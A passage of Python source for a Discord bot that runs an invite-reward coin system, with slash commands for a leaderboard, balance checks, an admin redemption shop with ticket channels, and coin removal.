        channel_name = f"{TICKET_PREFIX}{interaction.user.display_name}-{interaction.user.id}"
        ticket_channel = await guild.create_text_channel(name=channel_name, overwrites=overwrites)

        # Ticket embed
        ticket_embed = discord.Embed(
            title="🎫 Redemption Ticket",
            description=f"A new redemption request has been created!",
            color=discord.Color.green(),
            timestamp=interaction.created_at
        )
        ticket_embed.add_field(
            name="🛍️ Item Purchased", 
            value=f"**{item_name}**\n*{item_description}*", 
            inline=False
        )
        ticket_embed.add_field(
            name="👤 Customer Info", 
            value=f"**User:** {interaction.user.mention}\n**ID:** `{interaction.user.id}`", 
            inline=True
        )
        ticket_embed.add_field(
            name="💰 Payment Info", 
            value=f"**Cost:** {cost} coins\n**Remaining Balance:** {new_balance} coins", 
            inline=True
        )
        ticket_embed.set_thumbnail(url=interaction.user.display_avatar.url)
        ticket_embed.set_footer(
            text=f"Ticket created by {interaction.user.display_name}", 
            icon_url=interaction.user.display_avatar.url
        )
        
        await ticket_channel.send(content="||@everyone||", embed=ticket_embed)

        # Success response
        success_embed = discord.Embed(
            title="✅ Redemption Successful!",
            description=f"Your **{item_name}** has been ordered successfully!",
            color=discord.Color.green()
        )
        success_embed.add_field(
            name="🎫 Ticket Channel", 
            value=f"{ticket_channel.mention}", 
            inline=False
        )
        success_embed.add_field(
            name="💰 Transaction Details", 
            value=f"**Spent:** {cost} coins\n**Remaining:** {new_balance} coins", 
            inline=True
        )
        success_embed.set_footer(text="An admin will process your order soon!")
        
        await interaction.response.send_message(embed=success_embed, ephemeral=True)

class RedeemView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(RedeemSelect())

def is_admin(interaction: discord.Interaction) -> bool:
    return isinstance(interaction.user, discord.Member) and interaction.user.guild_permissions.administrator

@bot.tree.command(name="inviteleader", description="📊 Show top 10 users with most invite coins.")
async def inviteleader(interaction: discord.Interaction):
    await interaction.response.defer()
    rows = await top_invite_holders(10)
    
    if not rows:
        embed = discord.Embed(
            title="📊 Invite Leaderboard",
            description="🚫 No invite data available yet!\n\n💡 Start inviting friends to appear on the leaderboard!",
            color=discord.Color.orange()
        )
        embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
        await interaction.followup.send(embed=embed, ephemeral=True)
        return

    embed = discord.Embed(
        title="🏆 Top Invite Holders",
        description="Here are the most active inviters in the server!",
        color=discord.Color.gold()
    )
    
    medals = ["🥇", "🥈", "🥉"]
    leaderboard_text = ""
    
    for idx, row in enumerate(rows, start=1):
        try:
            user = bot.get_user(row["user_id"]) or await bot.fetch_user(row["user_id"])
            medal = medals[idx-1] if idx <= 3 else f"`#{idx:2}`"
            coins = row["coins"]
            
            leaderboard_text += f"{medal} **{user.display_name}** - `{coins}` coin{'s' if coins != 1 else ''}\n"
        except:
            leaderboard_text += f"`#{idx:2}` *Unknown User* - `{row['coins']}` coins\n"
    
    embed.description = f"{embed.description}\n\n{leaderboard_text}"
    embed.set_footer(text="💡 Invite more friends to climb the leaderboard!")
    embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="checkbalance", description="💰 Check your invite coin balance.")
async def checkbalance(interaction: discord.Interaction):
    balance = await get_coins(interaction.user.id)
    
    embed = discord.Embed(
        title="💰 Your Coin Balance",
        color=discord.Color.gold()
    )
    
    if balance == 0:
        embed.description = f"💸 {interaction.user.mention}, you currently have **0** coins.\n\n🔗 Start inviting friends to earn your first coins!"
        embed.color = discord.Color.orange()
    elif balance == 1:
        embed.description = f"🪙 {interaction.user.mention}, you have **1** coin."
    else:
        embed.description = f"🪙 {interaction.user.mention}, you have **{balance}** coins."
    
    # Add spending suggestions
    if balance >= PET_COST:
        embed.add_field(
            name="🛒 You can afford:", 
            value=f"🐾 Pet ({PET_COST} coins)\n🍎 Fruits ({FRUITS_COST} coins)", 
            inline=False
        )
    elif balance >= FRUITS_COST:
        embed.add_field(
            name="🛒 You can afford:", 
            value=f"🍎 Fruits ({FRUITS_COST} coins)", 
            inline=False
        )
    else:
        embed.add_field(
            name="💡 Keep inviting!", 
            value=f"You need {FRUITS_COST - balance} more coins for Fruits\n"
                  f"You need {PET_COST - balance} more coins for a Pet", 
            inline=False
        )
    
    embed.set_thumbnail(url=interaction.user.display_avatar.url)
    embed.set_footer(text="1 Invite = 1 Coin • Use /redeem to spend coins")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="checkinvites", description="📨 Check how many invites a user has.")
@app_commands.describe(user="The user to check invites for (defaults to yourself)")
async def checkinvite(interaction: discord.Interaction, user: discord.Member = None):
    target_user = user or interaction.user
    balance = await get_coins(target_user.id)

    embed = discord.Embed(
        title="📨 Invite Statistics",
        color=discord.Color.blurple()
    )
    
    if target_user == interaction.user:
        embed.description = f"📊 **Your Invite Count**\n\n🔗 You have invited **{balance}** member{'s' if balance != 1 else ''} to the server!"
    else:
        embed.description = f"📊 **{target_user.display_name}'s Invite Count**\n\n🔗 They have invited **{balance}** member{'s' if balance != 1 else ''} to the server!"
    
    # Add achievement levels
    if balance >= 50:
        achievement = "🌟 Legendary Inviter"
        achievement_color = discord.Color.purple()
    elif balance >= 25:
        achievement = "💎 Master Inviter"
        achievement_color = discord.Color.blue()
    elif balance >= 10:
        achievement = "🔥 Active Inviter"
        achievement_color = discord.Color.orange()
    elif balance >= 5:
        achievement = "⭐ Regular Inviter"
        achievement_color = discord.Color.green()
    elif balance >= 1:
        achievement = "✨ New Inviter"
        achievement_color = discord.Color.light_grey()
    else:
        achievement = "📥 No Invites Yet"
        achievement_color = discord.Color.red()
    
    embed.color = achievement_color
    embed.add_field(
        name="🏆 Rank", 
        value=achievement, 
        inline=True
    )
    embed.add_field(
        name="💰 Coin Value", 
        value=f"{balance} coin{'s' if balance != 1 else ''}", 
        inline=True
    )
    
    embed.set_thumbnail(url=target_user.display_avatar.url)
    embed.set_footer(text="1 Successful Invite = 1 Coin")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="redeem", description="🛒 Open the redemption shop (Admin Only).")
async def redeem(interaction: discord.Interaction):
    if not is_admin(interaction):
        embed = discord.Embed(
            title="❌ Access Denied",
            description="🔒 Only administrators can open the redemption shop.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Contact an admin if you need to redeem items")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    embed = discord.Embed(
        title="🛒 Trusted Forge Invite Rewards Shop",
        description="Welcome to our exclusive rewards shop! Exchange your hard-earned invite coins for amazing items.",
        color=discord.Color.dark_gold()
    )
    
    embed.add_field(
        name="🍎 Fruits",
        value=f"**Cost:** {FRUITS_COST} coins\n*Fresh and delicious fruits basket*",
        inline=True
    )
    embed.add_field(
        name="🐾 Pet",
        value=f"**Cost:** {PET_COST} coins\n*Adorable companion for your journey*",
        inline=True
    )
    embed.add_field(
        name="💡 How to Earn Coins",
        value="• Invite friends to the server\n• Each successful invite = 1 coin\n• Use coins to purchase rewards",
        inline=False
    )
    
    embed.set_footer(text="Select an item below to purchase • Prices subject to availability")
    embed.set_image(url="https://wallpapercave.com/wp/wp15600242.png")
    embed.set_author(
        name="Redemption Shop", 
        icon_url=interaction.guild.icon.url if interaction.guild.icon else None
    )
    
    await interaction.response.send_message(embed=embed, view=RedeemView())

@bot.tree.command(name="redeemclose", description="🔒 Close a redemption ticket (Admin Only).")
async def redeemclose(interaction: discord.Interaction):
    if not is_admin(interaction):
        embed = discord.Embed(
            title="❌ Access Denied",
            description="🔒 Only administrators can close redemption tickets.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
        
    channel = interaction.channel
    if not isinstance(channel, discord.TextChannel) or not channel.name.startswith(TICKET_PREFIX):
        embed = discord.Embed(
            title="❌ Invalid Channel",
            description="🚫 This command can only be used inside redemption ticket channels.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Look for channels starting with 'ticket-'")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    # Closing announcement embed
    close_embed = discord.Embed(
        title="🔒 Ticket Closing",
        description=f"This redemption ticket is being closed by {interaction.user.mention}.",
        color=discord.Color.red(),
        timestamp=interaction.created_at
    )
    close_embed.add_field(
        name="👮 Closed by", 
        value=f"{interaction.user.mention}\n*{interaction.user.display_name}*", 
        inline=True
    )
    close_embed.add_field(
        name="⏱️ Channel Lifetime", 
        value="Deleting in 3 seconds...", 
        inline=True
    )
    close_embed.set_footer(
        text="Thank you for using our redemption system!", 
        icon_url=interaction.user.display_avatar.url
    )
    
    await channel.send(embed=close_embed)
    await asyncio.sleep(3)
    await channel.delete(reason=f"Redemption ticket closed by {interaction.user.display_name}")

@bot.tree.command(name="wipecoin", description="🧹 Remove coins from a user (Admin Only).")
@app_commands.describe(member="User to remove coins from", amount="Number of coins to remove")
async def wipecoin(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        embed = discord.Embed(
            title="❌ Access Denied",
            description="🔒 Only administrators can manage user coins.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    if amount < 0:
        embed = discord.Embed(
            title="❌ Invalid Amount",
            description="💸 The amount must be 0 or greater.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Use positive numbers only")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    old_balance = await get_coins(member.id)
    new_balance = await remove_coins(member.id, amount)
    actually_removed = old_balance - new_balance
    
    embed = discord.Embed(
        title="🧹 Coins Removed",
        description=f"Successfully processed coin removal for {member.mention}",
        color=discord.Color.orange(),
        timestamp=interaction.created_at
    )
    
    embed.add_field(
        name="👤 Target User", 
        value=f"{member.mention}\n*{member.display_name}*", 
        inline=True
    )
    embed.add_field(
        name="💰 Transaction Details", 
        value=f"**Requested Removal:** {amount} coins\n"
              f"**Actually Removed:** {actually_removed} coins\n"
              f"**Previous Balance:** {old_balance} coins\n"
              f"**New Balance:** {new_balance} coins", 
        inline=False
    )
    
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(
        text=f"Action performed by {interaction.user.display_name}", 
        icon_url=interaction.user.display_avatar.url
    )
    
    if actually_removed < amount:
        embed.add_field(
            name="ℹ️ Note", 
            value=f"User only had {old_balance} coins, so only {actually_removed} were removed.", 
            inline=False
        )
    
    await interaction.followup.send(embed=embed, ephemeral=True)

if __name__ == "__main__":
    bot.run(TOKEN)
